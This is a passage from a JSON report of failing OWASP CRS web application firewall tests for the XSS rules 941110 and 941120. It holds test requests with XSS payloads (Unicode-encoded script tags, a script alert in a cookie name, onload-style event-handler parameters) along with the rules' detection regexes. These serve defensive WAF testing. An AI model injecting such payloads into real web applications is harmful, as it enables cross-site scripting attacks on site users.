            "Content-Type" : "application/x-www-form-urlencoded"
          },
          "data" : "var=%ef%bc%9cscript%20%ef%bc%9ealert%281%29%ef%bc%9c/script%ef%bc%9e\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ XSS Filters - Category 1 ]=-"
        }, {
          "type" : "Comment",
          "text" : " http://xssplayground.net23.net/xssfilter.html"
        }, {
          "type" : "Comment",
          "text" : " script tag based XSS vectors, e.g., <script> alert(1)</script>"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)<script[^>]*>[\\s\\S]*?"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "XSS Filter - Category 1: Script Tag Vector"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941110",
    "test_id" : 8,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941110.yaml",
    "description" : "XSS in cookie name using unicode",
    "cause" : "failed expect_id check: 941110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=941390 - Javascript method detected" ]
    },
    "test" : {
      "test_id" : 8,
      "desc" : "XSS in cookie name using unicode",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "headers" : {
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "User-Agent" : "OWASP CRS test agent",
            "Cookie" : "script alert(1)/script=value"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ XSS Filters - Category 1 ]=-"
        }, {
          "type" : "Comment",
          "text" : " http://xssplayground.net23.net/xssfilter.html"
        }, {
          "type" : "Comment",
          "text" : " script tag based XSS vectors, e.g., <script> alert(1)</script>"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)<script[^>]*>[\\s\\S]*?"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "XSS Filter - Category 1: Script Tag Vector"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941120",
    "test_id" : 1,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941120.yaml",
    "description" : "XSS Filter - Category 2: Event Handler Vector",
    "cause" : "failed expect_id check: 941120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920180 - POST without Content-Length and Transfer-Encoding headers", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "XSS Filter - Category 2: Event Handler Vector",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post?%20%20onload%3d%20=vardata",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ XSS Filters - Category 2 ]=-"
        }, {
          "type" : "Comment",
          "text" : " XSS vectors making use of event handlers like onerror, onload etc, e.g., <body onload=\"alert(1)\">"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We are not listing all the known event handlers like rule 941160, but we"
        }, {
          "type" : "Comment",
          "text" : " limit the alerts to keywords of 3-50 characters after the prefix (\"on\")."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The shortest known event is \"onget\". The longest known event is \"onwebkitplaybacktargetavailabilitychanged\""
        }, {
          "type" : "Comment",
          "text" : " with 39 chars after the prefix. 50 chars adds a little bit of safety."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has been moved to PL2 since it has a tendency to trigger on random input."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)[\\s\\\"'`;/0-9=\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]on[a-zA-Z]{3,50}[\\s\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]*?=[^=]"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "XSS Filter - Category 2: Event Handler Vector"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941120",
    "test_id" : 2,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941120.yaml",
    "description" : "XSS Filter - Category 2: Event Handler Vector",
    "cause" : "failed expect_id check: 941120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920180 - POST without Content-Length and Transfer-Encoding headers", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "XSS Filter - Category 2: Event Handler Vector",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post?%20%20onabcdefgh%3d%20=vardata",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ XSS Filters - Category 2 ]=-"
        }, {
          "type" : "Comment",
          "text" : " XSS vectors making use of event handlers like onerror, onload etc, e.g., <body onload=\"alert(1)\">"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We are not listing all the known event handlers like rule 941160, but we"
        }, {
          "type" : "Comment",
          "text" : " limit the alerts to keywords of 3-50 characters after the prefix (\"on\")."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The shortest known event is \"onget\". The longest known event is \"onwebkitplaybacktargetavailabilitychanged\""
        }, {
          "type" : "Comment",
          "text" : " with 39 chars after the prefix. 50 chars adds a little bit of safety."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has been moved to PL2 since it has a tendency to trigger on random input."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)[\\s\\\"'`;/0-9=\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]on[a-zA-Z]{3,50}[\\s\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]*?=[^=]"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "XSS Filter - Category 2: Event Handler Vector"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941120",
    "test_id" : 4,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941120.yaml",
    "description" : "XSS Filter - Category 2: Event Handler Vector - now a positive test after updating lenght to 50",
    "cause" : "failed expect_id check: 941120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920180 - POST without Content-Length and Transfer-Encoding headers", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "XSS Filter - Category 2: Event Handler Vector - now a positive test after updating lenght to 50",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post?%20%20onabcdefghijklmnopqrstuvwxyz%3d%20=vardata",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ XSS Filters - Category 2 ]=-"
        }, {
          "type" : "Comment",
          "text" : " XSS vectors making use of event handlers like onerror, onload etc, e.g., <body onload=\"alert(1)\">"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We are not listing all the known event handlers like rule 941160, but we"
        }, {
          "type" : "Comment",
          "text" : " limit the alerts to keywords of 3-50 characters after the prefix (\"on\")."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The shortest known event is \"onget\". The longest known event is \"onwebkitplaybacktargetavailabilitychanged\""
        }, {
          "type" : "Comment",
          "text" : " with 39 chars after the prefix. 50 chars adds a little bit of safety."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has been moved to PL2 since it has a tendency to trigger on random input."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)[\\s\\\"'`;/0-9=\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]on[a-zA-Z]{3,50}[\\s\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]*?=[^=]"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "XSS Filter - Category 2: Event Handler Vector"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941120",
    "test_id" : 7,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941120.yaml",
    "description" : "Test longer event name onwebkitplaybacktargetavailabilitychanged",
    "cause" : "failed expect_id check: 941120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "Test longer event name onwebkitplaybacktargetavailabilitychanged",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?%20%20onwebkitplaybacktargetavailabilitychanged%3d%20=vardata",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ XSS Filters - Category 2 ]=-"
        }, {
          "type" : "Comment",
          "text" : " XSS vectors making use of event handlers like onerror, onload etc, e.g., <body onload=\"alert(1)\">"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We are not listing all the known event handlers like rule 941160, but we"
        }, {
          "type" : "Comment",
          "text" : " limit the alerts to keywords of 3-50 characters after the prefix (\"on\")."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The shortest known event is \"onget\". The longest known event is \"onwebkitplaybacktargetavailabilitychanged\""
        }, {
          "type" : "Comment",
          "text" : " with 39 chars after the prefix. 50 chars adds a little bit of safety."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has been moved to PL2 since it has a tendency to trigger on random input."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
